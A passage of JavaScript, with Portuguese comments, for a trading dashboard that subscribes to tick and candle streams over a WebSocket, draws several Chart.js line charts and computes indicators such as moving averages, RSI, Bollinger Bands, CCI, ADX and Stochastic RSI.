    count: inpNOTicks.value < 1001 ? 1001 : inpNOTicks.value,
    end: "latest",
    start: 1,
    style: "ticks",
    passthrough: {
      app_id: app_id,
      status_nya: ao,
      index_nya: ap
    }
  }));
};


// 3. Processamento de dados de candles
/*const processCandleData = (ae) => {
    if(!ae || !ae.echo_req) {
        console.error('Dados inválidos:', ae);
        return;
    }
    
    const granularity = ae.echo_req.granularity;
    
    console.log('Dados de candle recebidos:', ae);
    
    const granularity = ae.echo_req.granularity;
    if (!granularityArray.includes(granularity)) {
        console.error('Granularidade inválida:', granularity);
        return;
    }
    
    console.log('Processando granularidade:', granularity);

    const data = candleData[granularity];*/
    
const processCandleData = (ae) => {
    try {
        if(!ae?.echo_req?.granularity) return;
        
        const granularity = parseInt(ae.echo_req.granularity);
        if(!granularityArray.includes(granularity)) return;

        const data = candleData[granularity];

    // Atualização histórica inicial
    if (ae.candles) {
        data.history = ae.candles.map(c => ({
            epoch: c.epoch,
            open: parseFloat(c.open),
            high: parseFloat(c.high),
            low: parseFloat(c.low),
            close: parseFloat(c.close)
        }));
        data.lastComplete = data.history[data.history.length - 1];
    }

    // Atualização em tempo real
    if (ae.tick?.epoch) {
        if (!data.current || data.current.epoch !== ae.tick.epoch) {
            if (data.current) {
                data.history.push(data.current);
                data.lastComplete = data.current;
                if (data.history.length > 1000) data.history.shift();
            }
            data.current = {
                epoch: ae.tick.epoch,
                open: data.lastComplete ? data.lastComplete.close : ae.tick.quote,
                high: ae.tick.quote,
                low: ae.tick.quote,
                close: ae.tick.quote
            };
        } else {
            data.current.high = Math.max(data.current.high, ae.tick.quote);
            data.current.low = Math.min(data.current.low, ae.tick.quote);
            data.current.close = ae.tick.quote;
        }
    }
    
    console.log('Dados atualizados para', granularity, data);

    // showUpCandles(granularity);} // chamada antiga 
    updateCandleTable(granularity);} // Chamada atualizada
    catch(error) {
        console.error('Erro no processamento de candles:', error);
    }
};




const subscribeCandles = (granularity) => {
    const g = parseInt(granularity);
    if(isNaN(g)) return;
  vEval.send(JSON.stringify({
    subscribe: 1,
    ticks_history: mainSymbol,
    adjust_start_time: 1,
    count: 1000,
    end: "latest",
    start: 1,
    style: "candles",
    granularity: g,
    passthrough: {
      app_id: app_id,
      granularity: g
    }
  }));
};


/*
const showUpCandles = (granularity) => {
    console.log('Atualizando UI para granularidade:', granularity);
    const data = candleData[granularity];
    const allCandles = [...data.history, data.current].filter(Boolean);
    const pipSize = mainSymbol.includes('R_') ? 2 : 3; // Ajuste conforme necessário

    // Atualizar últimos 10 candles
    for (let i = 1; i <= 10; i++) {
        const candle = allCandles[allCandles.length - i];
        const element = document.getElementById(`thelast10candles_${granularity}_${i}`);
        if (element && candle) {
            element.textContent = candle.close.toFixed(pipSize);
            element.style.backgroundColor = candle.close > candle.open ? colorRise : 
                                         candle.close < candle.open ? colorFall : colorNo;
        }
    }

    // Atualizar dados do último candle completo
    if (data.lastComplete) {
        const elements = {
            open: document.getElementById(`thelast10candles_${granularity}_1_open`),
            high: document.getElementById(`thelast10candles_${granularity}_1_high`),
            low: document.getElementById(`thelast10candles_${granularity}_1_low`),
            close: document.getElementById(`thelast10candles_${granularity}_1_close`),
            change: document.getElementById(`thelast10candles_${granularity}_1_change`),
            changepercent: document.getElementById(`thelast10candles_${granularity}_1_changepercent`)
        };

        const change = data.lastComplete.close - data.lastComplete.open;
        const changePercent = (change / data.lastComplete.open * 100).toFixed(2);
        const color = change > 0 ? colorRise : change < 0 ? colorFall : colorNo;

        if (elements.open) elements.open.textContent = data.lastComplete.open.toFixed(pipSize);
        if (elements.high) elements.high.textContent = data.lastComplete.high.toFixed(pipSize);
        if (elements.low) elements.low.textContent = data.lastComplete.low.toFixed(pipSize);
        if (elements.close) elements.close.textContent = data.lastComplete.close.toFixed(pipSize);
        
        if (elements.change) {
            elements.change.textContent = change.toFixed(pipSize);
            elements.change.style.backgroundColor = color;
        }
        
        if (elements.changepercent) {
            elements.changepercent.textContent = `${changePercent}%`;
            elements.changepercent.style.backgroundColor = color;
        }
    }
    console.log('Elementos atualizados para', granularity);
};*/

// Obter candles para análise
// const currentGranularity = granularityArray[document.getElementById('selGranularity').selectedIndex];
// const candles = candleArrayUtama.filter(c => c.granularity === currentGranularity);


const createCandleChart = () => {
  const ctx = document.getElementById('chart_candles').getContext('2d');
  
  mainChartCandles = new Chart(ctx, {
    type: 'candlestick',
    data: {
      datasets: [{
        label: 'Candles',
        data: [],
        color: {
          up: '#089981',
          down: '#f23645',
          unchanged: '#999999'
        }
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      scales: {
        x: { type: 'time', time: { unit: 'minute' }},
        y: { position: 'right' }
      }
    }
  });
};
// createCandleChart();

/*
const updateGranularity = (granularity) => {
  vEval.send(JSON.stringify({ forget: idSubCandlesHistory }));
  subscribeCandles(parseInt(granularity));
};*/

// Último candle completo
const lastCandle = candleArrayUtama[candleArrayUtama.length - 2]; 

// Candle em formação (atual)
const currentCandle = candleArrayUtama[candleArrayUtama.length - 1];

/*
const handleCandleData = (candleData) => {
  // Assuming candleData is an array of candle objects
  candleData.forEach((candle, index) => {
    const candleElement = document.getElementById(`candle_${index + 1}`);
    if (candleElement) {
      candleElement.innerText = `Open: ${candle.open}, High: ${candle.high}, Low: ${candle.low}, Close: ${candle.close}`;
      candleElement.style.backgroundColor = candle.close > candle.open ? colorRise : colorFall;
    }
  });
};
*/
const createChartLast10Dig_Digit = () => {
  const au = document.getElementById("chart_last10dig_digit").getContext("2d");
  const av = ["10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  mainChartLast10Dig_Digit = new Chart(au, {
    type: "line",
    data: {
      labels: av,
      datasets: [{
        label: "Digit + Digit Move",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: true,
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        title: {
          display: true,
          text: "Digit + Digit Move",
          color: "#fff"
        },
        legend: {
          display: false,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: true,
          color: "#2e2e2e",
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (aw) {
              if (aw.tick.value > 0) {
                return "#2e2e2e";
              } else {
                if (aw.tick.value < 0) {
                  return "#2e2e2e";
                }
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
createChartLast10Dig_Digit();
const createChartLast10Dig_Change = () => {
  const ax = document.getElementById("chart_last10dig_change").getContext("2d");
  const ay = ["10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  mainChartLast10Dig_Change = new Chart(ax, {
    type: "line",
    data: {
      labels: ay,
      datasets: [{
        label: "Digit Change",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: true,
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        title: {
          display: true,
          text: "Digit Change",
          color: "#fff"
        },
        legend: {
          display: false,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: true,
          color: "#2e2e2e",
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (az) {
              if (az.tick.value > 0) {
                return "#2e2e2e";
              } else {
                if (az.tick.value < 0) {
                  return "#2e2e2e";
                }
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
createChartLast10Dig_Change();
const createChart20Cater = () => {
  const ba = document.getElementById("chart20cater").getContext("2d");
  const bb = ["20th", "19th", "18th", "17th", "16th", "15th", "14th", "13th", "12th", "11th", "10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  mainChart20Cater = new Chart(ba, {
    type: "line",
    data: {
      labels: bb,
      datasets: [{
        fill: false,
        lineTension: 0,
        backgroundColor: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
        borderColor: "#fff",
        borderWidth: 1,
        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: false
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: false
        },
        datalabels: {
          color: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          min: -10,
          max: 10,
          grid: {
            color: function (bc) {
              if (bc.tick.value > 0) {
                return "#2e2e2e";
              } else {
                if (bc.tick.value < 0) {
                  return "#2e2e2e";
                }
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
createChart20Cater();
const createChartLast10Tick_Tick = () => {
  const bd = document.getElementById("chart_last10tick_tick").getContext("2d");
  const bf = ["10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  mainChartLast10Tick_Tick = new Chart(bd, {
    type: "line",
    data: {
      labels: bf,
      datasets: [{
        label: "Tick + Move",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: true,
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        title: {
          display: true,
          text: "Tick + Move",
          color: "#fff"
        },
        legend: {
          display: false,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: true,
          color: "#2e2e2e",
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (bg) {
              if (bg.tick.value > 0) {
                return "#2e2e2e";
              } else {
                if (bg.tick.value < 0) {
                  return "#2e2e2e";
                }
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
createChartLast10Tick_Tick();
const createChartLast10Tick_Change = () => {
  const bh = document.getElementById("chart_last10tick_change").getContext("2d");
  const bi = ["10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  mainChartLast10Tick_Change = new Chart(bh, {
    type: "line",
    data: {
      labels: bi,
      datasets: [{
        label: "Tick Change",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: true,
        pointRadius: 5,
        pointHoverRadius: 8,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        title: {
          display: true,
          text: "Tick Change",
          color: "#fff"
        },
        legend: {
          display: false,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: true,
          color: "#2e2e2e",
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (bj) {
              if (bj.tick.value > 0) {
                return "#2e2e2e";
              } else {
                if (bj.tick.value < 0) {
                  return "#2e2e2e";
                }
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
createChartLast10Tick_Change();
const createChart20TickWorm = () => {
  const bk = document.getElementById("chart20tickworm").getContext("2d");
  const bl = ["20th", "19th", "18th", "17th", "16th", "15th", "14th", "13th", "12th", "11th", "10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  mainChart20TickWorm = new Chart(bk, {
    type: "line",
    data: {
      labels: bl,
      datasets: [{
        fill: false,
        lineTension: 0,
        backgroundColor: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
        borderColor: "#fff",
        borderWidth: 1,
        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        pointStyle: [false],
        pointRadius: 10,
        pointHoverRadius: 15,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: false
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: false
        },
        datalabels: {
          color: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (bm) {
              if (bm.tick.value > 0) {
                return "#2e2e2e";
              } else {
                if (bm.tick.value < 0) {
                  return "#2e2e2e";
                }
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
createChart20TickWorm();
const createChartTickTrisma = () => {
  const bn = document.getElementById("chartticktrisma").getContext("2d");
  const bo = ["101st", "100th", "99th", "98th", "97th", "96th", "95th", "94th", "93th", "92th", "91th", "90th", "89th", "88th", "87th", "86th", "85th", "84th", "83th", "82th", "81th", "80th", "79th", "78th", "77th", "76th", "75th", "74th", "73th", "72th", "71th", "70th", "69th", "68th", "67th", "66th", "65th", "64th", "63th", "62th", "61th", "60th", "59th", "58th", "57th", "56th", "55th", "54th", "53th", "52th", "51th", "50th", "49th", "48th", "47th", "46th", "45th", "44th", "43th", "42th", "41th", "40th", "39th", "38th", "37th", "36th", "35th", "34th", "33th", "32th", "31th", "30th", "29th", "28th", "27th", "26th", "25th", "24th", "23rd", "22nd", "21st", "20th", "19th", "18th", "17th", "16th", "15th", "14th", "13th", "12th", "11th", "10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  mainChartTickTrisma = new Chart(bn, {
    type: "line",
    data: {
      labels: bo,
      datasets: [{
        label: "Price",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: false,
        pointRadius: 5,
        pointHoverRadius: 8
      }, {
        label: "SMA#1",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#f00",
        borderWidth: 1,
        data: -999,
        pointStyle: false,
        pointRadius: 5,
        pointHoverRadius: 8,
        cubicInterpolationMode: "monotone",
        tension: 0.4
      }, {
        label: "SMA#2",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#0f0",
        borderWidth: 1,
        data: -999,
        pointStyle: false,
        pointRadius: 5,
        pointHoverRadius: 8,
        cubicInterpolationMode: "monotone",
        tension: 0.4
      }, {
        label: "SMA#3",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#00f",
        borderWidth: 1,
        data: -999,
        pointStyle: false,
        pointRadius: 5,
        pointHoverRadius: 8,
        cubicInterpolationMode: "monotone",
        tension: 0.4
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: false,
          color: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (bp) {
              if (bp.tick.value > 0) {
                return "#2e2e2e";
              } else {
                if (bp.tick.value < 0) {
                  return "#2e2e2e";
                }
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
createChartTickTrisma();
function addDataChartLast10Dig_Digit(bq, br, bt) {
  const bu = bq.data;
  if (bu.datasets.length > 0) {
    for (let bv = 0; bv < bu.datasets.length; ++bv) {
      bu.datasets[bv].data = br;
      bu.datasets[bv].backgroundColor = bt;
    }
    bq.options.plugins.datalabels.color = bt;
    bq.update("none");
  }
}
function addDataChartLast10Dig_Change(bw, bx, by) {
  const bz = bw.data;
  if (bz.datasets.length > 0) {
    for (let ca = 0; ca < bz.datasets.length; ++ca) {
      bz.datasets[ca].data = bx;
      bz.datasets[ca].backgroundColor = by;
    }
    bw.options.plugins.datalabels.color = by;
    bw.update("none");
  }
}
function addDataChart20Cater(cb, cc, cd) {
  const ce = cb.data;
  if (ce.datasets.length > 0) {
    for (let cf = 0; cf < ce.datasets.length; ++cf) {
      ce.datasets[cf].data = cc;
      ce.datasets[cf].backgroundColor = cd;
    }
    cb.options.plugins.datalabels.color = cd;
    cb.update("none");
  }
}
function addDataChartLast10Tick_Tick(cg, ch, ci) {
  const cj = cg.data;
  if (cj.datasets.length > 0) {
    for (let cl = 0; cl < cj.datasets.length; ++cl) {
      cj.datasets[cl].data = ch;
      cj.datasets[cl].backgroundColor = ci;
    }
    cg.options.plugins.datalabels.color = ci;
    cg.update("none");
  }
}
function addDataChartLast10Tick_Change(cm, cn, co) {
  const cp = cm.data;
  if (cp.datasets.length > 0) {
    for (let cq = 0; cq < cp.datasets.length; ++cq) {
      cp.datasets[cq].data = cn;
      cp.datasets[cq].backgroundColor = co;
    }
    cm.options.plugins.datalabels.color = co;
    cm.update("none");
  }
}
function addDataChart20TickWorm(cr, cs, ct, cu) {
  const cv = cr.data;
  if (cv.datasets.length > 0) {
    for (let cw = 0; cw < cv.datasets.length; ++cw) {
      cv.datasets[cw].data = cs;
      cv.datasets[cw].backgroundColor = ct;
      cv.datasets[cw].pointStyle = cu;
    }
    cr.options.plugins.datalabels.color = ct;
    cr.update("none");
  }
}
function addDataChartticktrisma(cx, cy) {
  const cz = cx.data;
  if (cz.datasets.length > 0) {
    for (let da = 0; da < cz.datasets.length; ++da) {
      cz.datasets[da].data = cy[da];
    }
    cx.update("none");
  }
}
function calculateMovingAverage(db, dc) {
  var dd = [];
  if (db.length < dc) {
    return dd;
  }
  var de = 0;
  for (var df = 0; df < dc; ++df) {
    de += db[df];
  }
  dd.push(de / dc);
  var dg = db.length - dc - 1;
  for (var df = 0; df < dg; ++df) {
    de = de - db[df];
    de = de + db[df + dc];
    dd.push(de / dc);
  }
  return dd;
}
function calculateRSI(dh, di) {
  let dj = [];
  let dk = [];
  let dl = [];
  let dm;
  let dn;
  let dp;
  let dq;
  let dr;
  dm = 0;
  dn = 0;
  for (dp = 1; dp <= di; dp++) {
    dm += Math.max(0, dh[dp] - dh[dp - 1]);
    dn += Math.max(0, dh[dp - 1] - dh[dp]);
  }
  dm /= di;
  dn /= di;
  dk.push(dm);
  dl.push(dn);
  dr = 100 - 100 / (1 + dm / dn);
  dj.push(dr.toFixed(2));
  for (dq = di + 1; dq < dh.length; dq++) {
    dm = (dk.slice(-1) * (di - 1) + Math.max(0, dh[dq] - dh[dq - 1])) / di;
    dn = (dl.slice(-1) * (di - 1) + Math.max(0, dh[dq - 1] - dh[dq])) / di;
    dk.push(dm);
    dl.push(dn);
    dr = 100 - 100 / (1 + dm / dn);
    dj.push(dr.toFixed(2));
  }
  return dj.slice(-1);
}
function calculateRSIArray(ds, dt) {
  let du = [];
  let dv = [];
  let dw = [];
  let dx;
  let dy;
  let dz;
  let ea;
  let eb;
  dx = 0;
  dy = 0;
  for (dz = 1; dz <= dt; dz++) {
    dx += Math.max(0, ds[dz] - ds[dz - 1]);
    dy += Math.max(0, ds[dz - 1] - ds[dz]);
  }
  dx /= dt;
  dy /= dt;
  dv.push(dx);
  dw.push(dy);
  eb = 100 - 100 / (1 + dx / dy);
  du.push(eb.toFixed(2));
  for (ea = dt + 1; ea < ds.length; ea++) {
    dx = (dv.slice(-1) * (dt - 1) + Math.max(0, ds[ea] - ds[ea - 1])) / dt;
    dy = (dw.slice(-1) * (dt - 1) + Math.max(0, ds[ea - 1] - ds[ea])) / dt;
    dv.push(dx);
    dw.push(dy);
    eb = 100 - 100 / (1 + dx / dy);
    du.push(eb.toFixed(2));
  }
  return du;
}
function calculateBollingerBands(ec, ed, ee) {
  ec = ec.slice(-ed);
  let ef = 0;
  for (let eg = 0; eg < ed; eg++) {
    ef += ec[eg];
  }
  const eh = ef / ed;
  ef = 0;
  for (let ei = 0; ei < ed; ei++) {
    ef += Math.pow(ec[ei] - eh, 2);
  }
  const ej = Math.sqrt(ef / ed);
  const em = eh + ej * ee;
  const en = eh - ej * ee;
  return [em, eh, en];
}

function calculateCCI(prices, period) {
  let cci = [];
  let typicalPrice = [];
  
  for (let i = 0; i < prices.length; i++) {
    // Calcula o preço típico (modificado para ticks)
    typicalPrice.push(prices[i]); // Aqui você pode usar High, Low, Close se necessário
    if (i >= period - 1) {
      let mean = typicalPrice.slice(i - period + 1, i + 1).reduce((a, b) => a + b, 0) / period;
      let deviation = typicalPrice.slice(i - period + 1, i + 1).reduce((a, b) => a + Math.abs(b - mean), 0) / period;
      cci.push((typicalPrice[i] - mean) / (0.015 * deviation)); // O fator 0.015 é uma constante
    }
  }
  return cci;
}

function calculateADX(ticks, period) {
    let adx = [];
    let plusDM = [];
    let minusDM = [];
    let diPlus = [];
    let diMinus = [];
    let tr = [];
    let dxValues = []; // Array para armazenar os valores de DX

    // Verifica se o número de ticks é suficiente
    if (ticks.length < period * 2) {
        console.error("Número insuficiente de ticks para calcular o ADX.");
        return [];
    }

    for (let i = 1; i < ticks.length; i++) {
        // Calcula o True Range (TR)
        let trueRange = Math.abs(ticks[i] - ticks[i - 1]);
        tr.push(trueRange);

        // Calcula o +DM e -DM
        let priceDiff = ticks[i] - ticks[i - 1];
        let plusDMValue = (priceDiff > 0) ? priceDiff : 0;
        let minusDMValue = (priceDiff < 0) ? -priceDiff : 0;
        plusDM.push(plusDMValue);
        minusDM.push(minusDMValue);
    }

    // Calcula o ADX
    for (let i = period; i < ticks.length; i++) {
        let avgTR = tr.slice(i - period + 1, i + 1).reduce((a, b) => a + b, 0) / period;
        let avgPlusDM = plusDM.slice(i - period + 1, i + 1).reduce((a, b) => a + b, 0) / period;
        let avgMinusDM = minusDM.slice(i - period + 1, i + 1).reduce((a, b) => a + b, 0) / period;

        // Log para verificar os valores
        // console.log(`i: ${i}, avgTR: ${avgTR}, avgPlusDM: ${avgPlusDM}, avgMinusDM: ${avgMinusDM}`);

        let diPlusValue = (avgTR !== 0) ? (avgPlusDM / avgTR) * 100 : 0;
        let diMinusValue = (avgTR !== 0) ? (avgMinusDM / avgTR) * 100 : 0;
        diPlus.push(diPlusValue);
        diMinus.push(diMinusValue);

        // Log para verificar os valores de DI
         console.log(`diPlusValue: ${diPlusValue}, diMinusValue: ${diMinusValue}`);

        // Calcula o DX
        let dx = (diPlusValue + diMinusValue !== 0) ? (Math.abs(diPlusValue - diMinusValue) / (diPlusValue + diMinusValue)) * 100 : 0;

        // Log para verificar o valor de DX
        // console.log(`dx: ${dx}`);

        // Armazena o valor de DX
        dxValues.push(dx);
        // console.log(`dxValues[${dxValues.length - 1}]: ${dx}`); // Log para verificar se o dx está sendo adicionado

        // Calcula a média do DX para o ADX
        if (i >= period * 2 - 1) {
            // Pega os últimos "period" valores de DX
            let sumDX = 0;
            for (let j = 0; j < period; j++) {
                sumDX += dxValues[dxValues.length - 1 - j]; // Soma os últimos "period" valores
            }
            let avgDX = sumDX / period; // Calcula a média
            adx.push(avgDX); // Adiciona a média ao array de ADX
        }
    }

    // Preenche o ADX com valores nulos para os primeiros períodos
    while (adx.length < ticks.length - period * 2 + 1) {
        adx.unshift(null); // Adiciona null para os primeiros valores onde o ADX não pode ser calculado
    }

    return [adx, diPlus, diMinus]; // Retorna o array de ADX
}

function calculateTrueRange(ticks) {
  var tr = [];
  if (ticks.length < 2) {
    return tr; // Retorna array vazio se não houver dados suficientes
  }

  for (var i = 1; i < ticks.length; i++) {
    var currentPrice = ticks[i];
    var previousPrice = ticks[i - 1];

    // Calcula a diferença absoluta entre o preço atual e o anterior
    // var priceDifference = Math.abs(currentPrice - previousPrice); // Valores absolutos
       var priceDifference = (currentPrice - previousPrice);
    

    // Adiciona a diferença ao array de True Range
    tr.push(priceDifference);
  }

  return tr;
}

// Cálculo do RSI para o Estocástico
function calculateRSIpst(ticks, period) {
    let gains = 0;
    let losses = 0;

    for (let i = 1; i < ticks.length; i++) {
        const change = ticks[i] - ticks[i - 1];
        if (change > 0) {
            gains += change;
        } else {
            losses -= change; // losses é negativo, então subtraímos
        }
    }

    const averageGain = gains / period;
    const averageLoss = losses / period;

    if (averageLoss === 0) return 100; // Para evitar divisão por zero

    const rs = averageGain / averageLoss;
    return 100 - (100 / (1 + rs));
}
/*
function calculateStochasticRSI(ticks, rsiPeriod, stochPeriod) {
    let rsiValues = [];
    let stochasticRSI = [];

    // Calcula o RSI para cada ponto
    for (let i = rsiPeriod; i <= ticks.length; i++) {
        const rsi = calculateRSIpst(ticks.slice(i - rsiPeriod, i), rsiPeriod);
        rsiValues.push(rsi);
    }

    // Calcula o Stochastic RSI
    for (let i = stochPeriod - 1; i < rsiValues.length; i++) {
        const rsiSlice = rsiValues.slice(i - stochPeriod + 1, i + 1);
        const minRSI = Math.min(...rsiSlice);
        const maxRSI = Math.max(...rsiSlice);
        const currentRSI = rsiValues[i];

        if (maxRSI === minRSI) {
            stochasticRSI.push(0); // Para evitar divisão por zero
        } else {
            const stochRSI = (currentRSI - minRSI) / (maxRSI - minRSI);
            // stochasticRSI.push(stochRSI * 100); // Multiplica por 100 para ter uma escala de 0 a 100
            stochasticRSI.push(stochRSI);          // Não multiplica por 100 para ter uma escala de 0 a 1
        }
    }

    // Preenche o Stochastic RSI com valores nulos para os primeiros períodos
    while (stochasticRSI.length < ticks.length - rsiPeriod - stochPeriod + 2) {
        stochasticRSI.unshift(null);
    }

    return stochasticRSI; // Retorna o array de Stochastic RSI
}*/

function calculateStochasticRSI(ticks, rsiPeriod, stochPeriod, kPeriod, dPeriod) {
    let rsiValues = [];
    let stochasticRSI = [];
    let kValues = [];
    let dValues = [];

    // Calcula o RSI para cada ponto
    for (let i = rsiPeriod; i <= ticks.length; i++) {
        const rsi = calculateRSIpst(ticks.slice(i - rsiPeriod, i), rsiPeriod);
        rsiValues.push(rsi);
    }

    // Calcula o Stochastic RSI
    for (let i = stochPeriod - 1; i < rsiValues.length; i++) {
        const rsiSlice = rsiValues.slice(i - stochPeriod + 1, i + 1);
        const minRSI = Math.min(...rsiSlice);
        const maxRSI = Math.max(...rsiSlice);
        const currentRSI = rsiValues[i];

        if (maxRSI === minRSI) {
            stochasticRSI.push(0); // Para evitar divisão por zero
        } else {
            const stochRSI = (currentRSI - minRSI) / (maxRSI - minRSI);
            stochasticRSI.push(stochRSI * 100); // Multiplica por 100 para ter uma escala de 0 a 100
        //    stochasticRSI.push(stochRSI); // Não multiplica por 100 para ter uma escala de 0 a 1
        }
    }

    // Cálculo do K
    for (let i = kPeriod - 1; i < stochasticRSI.length; i++) {
        const kSlice = stochasticRSI.slice(i - kPeriod + 1, i + 1);
        const kValue = kSlice.reduce((a, b) => a + b, 0) / kPeriod; // Média simples
        kValues.push(kValue);
    }

    // Cálculo do D
    for (let i = dPeriod - 1; i < kValues.length; i++) {
